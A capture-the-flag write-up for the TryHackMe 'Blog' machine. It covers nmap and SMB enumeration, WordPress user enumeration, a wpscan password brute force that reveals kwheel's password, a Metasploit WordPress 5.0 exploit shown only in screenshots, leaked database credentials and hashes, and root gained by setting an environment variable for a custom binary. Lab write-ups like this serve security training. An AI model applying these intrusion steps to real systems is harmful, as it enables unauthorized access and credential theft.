# TryHackMe-Blog

## NMAP

```
Nmap scan report for 10.10.62.12
Host is up (0.17s latency).                                                                                                                         
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION                                         
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:                     
|   2048 57:8a:da:90:ba:ed:3a:47:0c:05:a3:f7:a8:0a:8d:78 (RSA)
|   256 c2:64:ef:ab:b1:9a:1c:87:58:7c:4b:d5:0f:20:46:26 (ECDSA)
|_  256 5a:f2:62:92:11:8e:ad:8a:9b:23:82:2d:ad:53:bc:16 (ED25519)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
| http-robots.txt: 1 disallowed entry  
|_/wp-admin/                     
|_http-server-header: Apache/2.4.29 (Ubuntu)          
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux; CPE: cpe:/o:linux:linux_kernel
                                     
Host script results:
|_nbstat: NetBIOS name: BLOG, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:                                                                                                                                 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)                    
|   Computer name: blog                                                   
|   NetBIOS computer name: BLOG\x00                                       
|   Domain name: \x00
|   FQDN: blog
|_  System time: 2020-11-11T18:34:52+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-11T18:34:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.80 seconds
```

## PORT 139/445 (SMB)

We know that there are smb shares on this box so let's see which shares we can access

<img src="https://imgur.com/mG2Ix1R.png"/>

Let's grab the two photos from here and save it on our local machine

```
smb: \> get Alice-White-Rabbit.jpg
getting file \Alice-White-Rabbit.jpg of size 33378 as Alice-White-Rabbit.jpg (34.8 KiloBytes/sec) (average 34.8 KiloBytes/sec)
smb: \> get check-this.png
getting file \check-this.png of size 3082 as check-this.png (4.5 KiloBytes/sec) (average 22.3 KiloBytes/sec)
smb: \> 

```
Now we will see that there is a qr-image so use `zbarimg` to see what text we get from it 

<img src="https://imgur.com/bWgCvyw.png"/>

```
root@kali:~/TryHackMe/Medium/Blog# zbarimg check-this.png 
QR-Code:https://qrgo.page.link/M6dE
```
We will get a link that points to a video on youtube `Billy Joel - We Didn't Start the Fire (Official Video)` .

This seems like a rabbithole ....

```
root@kali:~/TryHackMe/Medium/Blog# steghide --extract -sf Alice-White-Rabbit.jpg 
Enter passphrase: 
wrote extracted data to "rabbit_hole.txt".
root@kali:~/TryHackMe/Medium/Blog# cat rabbit_hole.txt 
You've found yourself in a rabbit hole, friend.
root@kali:~/TryHackMe/Medium/Blog# 
```

And I was right being in the wrong path :D

## PORT 80

Moving on to web page

<img src="https://imgur.com/gGmGdj0.png"/>

<img src="https://imgur.com/X5bNz91.png"/>

Now your seeing this page like this because we have to add `blog.thm` into our `/etc/hosts/`


<img src="https://imgur.com/HfkqgW6.png"/>

Now it's loading properly

Looking at `robots.txt`

<img src="https://imgur.com/wHVSCs6.png"/>

I found a wordpress login page

<img src="https://imgur.com/04CGcge.png"/>


## Gobuster

`gobuster dir -u http://blog.thm -w /usr/share/wordlists/big.txt`
```
2020/11/11 23:56:33 Starting gobuster
===============================================================
/! (Status: 301)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/0 (Status: 301)
/0000 (Status: 301)
/2020 (Status: 301)
/admin (Status: 302)
/asdfjkl; (Status: 301)
/atom (Status: 301)
/dashboard (Status: 302)
/embed (Status: 301)
/favicon.ico (Status: 200)
/feed (Status: 301)
/fixed! (Status: 301)
Progress: 9204 / 20470 (44.96%
```
I didn't find anything interesting with gobuster so doing something with wordpress login page is the only way in

## WPSCAN

I used `wpscan` to enumerate for users and wordpress version

```
oot@kali:~/TryHackMe/Medium/Blog# wpscan -e --url 10.10.62.12            
_______________________________________________________________                                                                                     
         __          _______   _____                                                                                                                
         \ \        / /  __ \ / ____|                                 
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                              
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                                                                               
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                              
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                              
                                                                          
         WordPress Security Scanner by the WPScan Team                                                                                              
                         Version 3.8.4                                                                                                              
       Sponsored by Automattic - https://automattic.com/                                                                                            
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.62.12/ [10.10.62.12]
[+] Started: Thu Nov 12 00:15:15 2020

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] http://10.10.62.12/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.62.12/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
[i] User(s) Identified:

[+] bjoel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.62.12/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] kwheel
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://10.10.62.12/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] Karen Wheeler
 | Found By: Rss Generator (Aggressive Detection)

[+] Billy Joel
 | Found By: Rss Generator (Aggressive Detection)

[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

[+] Finished: Thu Nov 12 00:17:18 2020
[+] Requests Done: 3086
[+] Cached Requests: 30
[+] Data Sent: 762.895 KB
[+] Data Received: 1.192 MB
[+] Memory used: 230.801 MB
[+] Elapsed time: 00:02:03

```
And I found two users `bjoel` and `kwheel` lets put this in a text file bruteforce thier passwords

```
wpscan --url http://blog.thm -U users.txt  -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________                                                                                     
         __          _______   _____
         \ \        / /  __ \ / ____|                   
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®                                                                                              
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                                                                               
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                              
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                              
                                                                          
         WordPress Security Scanner by the WPScan Team                    
                         Version 3.8.4           
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                    
_______________________________________________________________                                                                                     
                                                                          
[+] URL: http://blog.thm/ [10.10.62.12]                                   
[+] Started: Thu Nov 12 00:27:33 2020
                                                                          
Interesting Finding(s):                                                   
                                                                          
[+] Headers                                                                                                                                         
 | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)       
 | Found By: Headers (Passive Detection)              
 | Confidence: 100%
                                                                          
[+] http://blog.thm/robots.txt                                            
 | Interesting Entries:
 [+] Enumerating All Plugins (via Passive Methods)                         
                                     
[i] No plugins Found.                                                     
                                                                          
[+] Enumerating Config Backups (via Passive and Aggressive Methods)       
 Checking Config Backups - Time: 00:00:01 <=======================================================================> (21 / 21) 100.00% Time: 00:00:01
                                                                          
[i] No Config Backups Found.                                              
                                     
[+] Performing password attack on Xmlrpc against 2 user/s                 
[SUCCESS] - kwheel / cutiepie1                                            
Trying bjoel / heaven1 Time: 00:07:54 <                                                                    > (6030 / 28691649)  0.02%                                      
```

It took some time but we  got `khweel`'s passwords

<img src="https://imgur.com/DWdyc3o.png"/>

And now we logged in as `khweel` in wordpress

Then I did a litte resarch on goole if there's an exploit available for `wordpress 5.0`
<img src="https://imgur.com/iYBp3s0.png"/>

<img src="https://imgur.com/Sv1YLJr.png"/>

So there's an exploit available for it on `metasploit`

<img src="https://imgur.com/ujtxWM3.png"/>

You could also search for it on `searchsploit` and it's going to show up as it's on `exploit-db`

<img src="https://imgur.com/e1z0Glb.png"/>

But I will be using metasploit because a tool is available for you why not use it :D

<img src="https://cdn.discordapp.com/attachments/522158539129618453/776178719538282526/Screenshot_2020-11-12_01-14-49.png"/>

I tried to use it but it kept failing, after quite sometime and restarted metasploit and then the exploit worked

<img src="https://imgur.com/lKwtShW.png"/>

I didn't find anythin in `bjoel`'s home directory I quickly ran `linpeas`

<img src="https://imgur.com/jzebLi2.png"/>


<img src="https://imgur.com/Uud4GIW.png"/>

These were the things I found out of linpeas

```
define('DB_NAME', 'blog');                                                                                                                          
define('DB_USER', 'wordpressuser');                                                                                                                 
define('DB_PASSWORD', 'LittleYellowLamp90!@');                                                                                                      
define('DB_HOST', 'localhost');    
```
Now a mysql database must be ruuning on localhost so lets try to login with these credentials

<img src="https://imgur.com/8rfshh6.png"/>

As we can see `DB_NAME` is `blog`

```
mysql> use blog
use blog
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-----------------------+
| Tables_in_blog        |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)

mysql> 

```

I ran command to select all entries in `wp_users`

```
mysql> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
| ID | user_login | user_pass                          | user_nicename | user_email                   | user_url | user_registered     | user_activation_key | user_status | display_name  |
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
|  1 | bjoel      | $P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/ | bjoel         | nconkl1@outlook.com          |          | 2020-05-26 03:52:26 |                     |           0 | Billy Joel    |
|  3 | kwheel     | $P$BedNwvQ29vr1TPd80CDl6WnHyjr8te. | kwheel        | zlbiydwrtfjhmuuymk@ttirv.net |          | 2020-05-26 03:57:39 |                     |           0 | Karen Wheeler |
+----+------------+------------------------------------+---------------+------------------------------+----------+---------------------+---------------------+-------------+---------------+
```
Let's try cracking these hashes

<img src="https://imgur.com/OeLblO1.png"/>

But this was useless as we already got that password

<img src="https://imgur.com/bwcmDWv.png"/>

I then tried to run `/usr/sbin/checker` and it looked like it is customized

<img src="https://imgur.com/PjTWprr.png"/>


This looks like Buffer Overflow exploitation

<img src="https://imgur.com/DAFXCNS.png"/>


This tells that there's variable that is holds bash variable `$admin`'s value and it's comparing it wheather it's empty or not so you can see that on null value it would terminate so we need to set the value true 

```
www-data@blog:/media$ export admin=true
export admin=true
www-data@blog:/media$ echo $admin
echo $admin
true
www-data@blog:/media$ /usr/sbin/checker
/usr/sbin/checker
root@blog:/media# 

```
